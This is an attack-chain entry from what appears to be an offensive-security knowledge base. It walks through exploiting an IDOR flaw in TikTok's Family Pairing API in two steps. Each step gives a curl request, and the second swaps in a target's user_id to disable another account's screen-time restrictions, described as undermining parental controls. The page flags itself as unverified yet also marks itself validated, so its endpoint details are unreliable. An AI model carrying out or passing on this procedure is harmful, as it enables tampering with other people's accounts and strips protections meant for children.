---
tags:
  - idor
  - api
  - tiktok
  - parental-controls
  - unauthorized-access
type: attack_chain
tools: []
tactics:
  - '[[Discovery]]'
verified: false
platforms:
  - Web
  - Mobile API
submitted: true
complexity: medium
created_at: '2023-10-05T12:00:00Z'
procedures:
  - '[[procedures/Exploit-IDOR-in-Family-Pairing-API]]'
step_count: 2
techniques:
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:28.979Z'
description: >-
  An attack chain exploiting an Insecure Direct Object Reference (IDOR)
  vulnerability in TikTok's Family Pairing API, allowing unauthorized access and
  modification of other users' screen time management settings.
skill_level: intermediate
impact_level: high
id: af2650bc-2003-4c92-b44f-b59246085e58
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
---
# IDOR in TikTok Family Pairing API to Disable Screen Time Restrictions

Multi-stage attack chain demonstrating exploitation of an IDOR vulnerability in the TikTok Family Pairing API to gain unauthorized access to other users' accounts and modify screen time management settings, potentially disabling parental controls.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via API Testing] --> B[Exploit IDOR for Unauthorized Modification]
    B --> C[Objective: Disable Restrictions]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[Burp Suite]] (for intercepting and modifying API requests)

### Target Environment

- TikTok mobile app or web interface with API access
- Family Pairing API endpoint
- Network access to TikTok servers (no specific ports required beyond standard HTTPS/443)

### Initial Access Requirements

- Authenticated session as a TikTok user (e.g., valid access token)
- Knowledge of a target user_id (e.g., from public profiles or enumeration)
- No prior elevated access needed, but app installation or web access required

## Detailed Attack Procedures

### Step 1: Identify and Test Family Pairing API Endpoint
procedure: [[procedures/Exploit-IDOR-in-Family-Pairing-API]]

**Objective**: Locate the Family Pairing API endpoint and verify normal functionality with the attacker's own user_id to understand the request structure.

**Instructions**: Use a proxy tool like Burp Suite to intercept requests from the TikTok app during family pairing setup. Send a POST request to the endpoint with your own user_id to confirm successful access to settings.

For example, intercept the request and note the structure:

```bash
curl -X POST https://api.tiktok.com/family/pairing \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_id": "YOUR_USER_ID", "action": "get_settings"}'
```

**Expected Output**: JSON response containing your own screen time settings, confirming the endpoint works.

**Success Indicators**:
- Valid response with settings data for the provided user_id
- No authentication errors

### Step 2: Exploit IDOR to Modify Target User Settings
procedure: [[procedures/Exploit-IDOR-in-Family-Pairing-API]]

**Objective**: Modify the user_id parameter to target another user's account and disable screen time restrictions without authorization checks.

**Instructions**: Replay the intercepted request but replace the user_id with a target user's ID (e.g., obtained from public sources). Send a POST request to update settings, such as disabling restrictions.

```bash
curl -X POST https://api.tiktok.com/family/pairing \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_id": "TARGET_USER_ID", "action": "update_settings", "screen_time_enabled": false}'
```

Validate the change by sending a GET request for the same user_id to confirm modifications.

**Expected Output**: Success response indicating settings updated; subsequent GET shows disabled restrictions.

**Success Indicators**:
- Settings modified for the target user without ownership errors
- Target user (or family member) can now bypass restrictions

## Attack Chain Summary

### Key Achievements

1. Unauthorized access to arbitrary user accounts via IDOR in the user_id parameter
2. Modification of screen time management settings, disabling parental controls
3. Potential for family members to self-remove restrictions, undermining security

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Account Discovery]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Discovery]]

---
*Last updated: 2023-10-05T12:00:00Z*
